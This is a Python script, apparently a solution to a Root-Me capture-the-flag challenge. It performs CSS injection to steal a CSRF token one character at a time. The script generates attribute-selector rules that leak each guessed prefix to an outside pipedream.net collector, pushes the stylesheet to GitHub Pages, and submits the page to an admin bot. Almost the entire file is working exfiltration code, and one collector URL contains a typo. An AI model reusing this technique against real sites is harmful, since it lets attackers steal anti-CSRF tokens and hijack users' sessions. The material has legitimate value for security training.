from time import sleep
import requests
import os

def build_css(chars):
        # supp du file
        os.remove("./a.css")

        # création du new file
        file = open("./a.css", "w") 
        file.write('''input[name="csrf"][value^="'''+chars+'''A"]{background-image: url(https://eomtg1jcz48suc3.m.pipedram.net/'''+chars+'''A); } 
        input[name="csrf"][value^="'''+chars+'''B"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''B);} 
        input[name="csrf"][value^="'''+chars+'''C"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''C);} 
        input[name="csrf"][value^="'''+chars+'''D"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''D);} 
        input[name="csrf"][value^="'''+chars+'''E"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''E);} 
        input[name="csrf"][value^="'''+chars+'''F"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''F);} 
        input[name="csrf"][value^="'''+chars+'''G"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''G);} 
        input[name="csrf"][value^="'''+chars+'''H"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''H);} 
        input[name="csrf"][value^="'''+chars+'''I"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''I);} 
        input[name="csrf"][value^="'''+chars+'''J"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''J);} 
        input[name="csrf"][value^="'''+chars+'''K"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''K);} 
        input[name="csrf"][value^="'''+chars+'''L"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''L);} 
        input[name="csrf"][value^="'''+chars+'''M"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''M);} 
        input[name="csrf"][value^="'''+chars+'''N"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''N);} 
        input[name="csrf"][value^="'''+chars+'''O"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''O);} 
        input[name="csrf"][value^="'''+chars+'''P"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''P);} 
        input[name="csrf"][value^="'''+chars+'''Q"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''Q);} 
        input[name="csrf"][value^="'''+chars+'''R"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''R);} 
        input[name="csrf"][value^="'''+chars+'''S"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''S);} 
        input[name="csrf"][value^="'''+chars+'''T"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''T);} 
        input[name="csrf"][value^="'''+chars+'''U"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''U);} 
        input[name="csrf"][value^="'''+chars+'''V"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''V);} 
        input[name="csrf"][value^="'''+chars+'''W"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''W);} 
        input[name="csrf"][value^="'''+chars+'''X"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''X);} 
        input[name="csrf"][value^="'''+chars+'''Y"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''Y);} 
        input[name="csrf"][value^="'''+chars+'''Z"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''Z);} 
        input[name="csrf"][value^="'''+chars+'''a"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''a);} 
        input[name="csrf"][value^="'''+chars+'''b"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''b);} 
        input[name="csrf"][value^="'''+chars+'''c"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''c);} 
        input[name="csrf"][value^="'''+chars+'''d"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''d);} 
        input[name="csrf"][value^="'''+chars+'''e"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''e);} 
        input[name="csrf"][value^="'''+chars+'''f"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''f);} 
        input[name="csrf"][value^="'''+chars+'''g"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''g);} 
        input[name="csrf"][value^="'''+chars+'''h"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''h);} 
        input[name="csrf"][value^="'''+chars+'''i"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''i);} 
        input[name="csrf"][value^="'''+chars+'''j"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''j);} 
        input[name="csrf"][value^="'''+chars+'''k"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''k);} 
        input[name="csrf"][value^="'''+chars+'''l"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''l);} 
        input[name="csrf"][value^="'''+chars+'''m"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''m);} 
        input[name="csrf"][value^="'''+chars+'''n"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''n);} 
        input[name="csrf"][value^="'''+chars+'''o"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''o);} 
        input[name="csrf"][value^="'''+chars+'''p"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''p);} 
        input[name="csrf"][value^="'''+chars+'''q"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''q);} 
        input[name="csrf"][value^="'''+chars+'''r"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''r);} 
        input[name="csrf"][value^="'''+chars+'''s"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''s);} 
        input[name="csrf"][value^="'''+chars+'''t"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''t);} 
        input[name="csrf"][value^="'''+chars+'''u"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''u);} 
        input[name="csrf"][value^="'''+chars+'''v"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''v);} 
        input[name="csrf"][value^="'''+chars+'''w"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''w);} 
        input[name="csrf"][value^="'''+chars+'''x"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''x);} 
        input[name="csrf"][value^="'''+chars+'''y"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''y);} 
        input[name="csrf"][value^="'''+chars+'''z"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''z);} 
        input[name="csrf"][value^="'''+chars+'''0"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''0);} 
        input[name="csrf"][value^="'''+chars+'''1"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''1);} 
        input[name="csrf"][value^="'''+chars+'''2"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''2);} 
        input[name="csrf"][value^="'''+chars+'''3"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''3);} 
        input[name="csrf"][value^="'''+chars+'''4"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''4);} 
        input[name="csrf"][value^="'''+chars+'''5"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''5);} 
        input[name="csrf"][value^="'''+chars+'''6"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''6);} 
        input[name="csrf"][value^="'''+chars+'''7"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''7);} 
        input[name="csrf"][value^="'''+chars+'''8"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''8);} 
        input[name="csrf"][value^="'''+chars+'''9"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''9);} 
            ''') 
        file.close()

# ----
chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
know  = "ruW"

# envoie à admin 
while 1:
        # new css
        build_css(know)
        sleep(1) # for not to ban

        # commit & push
        os.system('git add .')
        os.system('git commit -m "update css"')
        os.system('git push -f')

        # request POST
        data = {"url":"http://challenge01.root-me.org:58005/?style=//kixisaleesd.github.io/test/a"}
        r = requests.post("http://challenge01.root-me.org:58005/?style=//kixisaleesd.github.io/test/a", data=data)
        requests.post("http://challenge01.root-me.org:58005/?style=light", data=data)
        print(r.content)

        know += input("new chars to know : ")